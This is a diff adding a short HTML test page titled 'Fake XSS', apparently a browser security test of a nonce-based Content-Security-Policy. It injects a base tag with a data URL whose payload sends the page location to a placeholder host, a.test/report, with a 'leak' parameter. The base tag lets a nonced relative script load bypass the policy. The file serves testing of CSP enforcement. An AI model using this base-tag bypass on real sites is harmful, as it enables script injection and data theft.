@@ -1,0 +1,9 @@
+<html>
+<head>
+<meta http-equiv="Content-Security-Policy" content="object-src 'none';script-src 'nonce-random-secret'">
+<title> Fake XSS </title> </head>
+<body>
+<base href="data:/,-document.location.href='https://a.test/report/?leak=c689412'//"/>
+<script src="./lib/jquery.js" nonce="random-secret"></script>
+</body>
+</html>
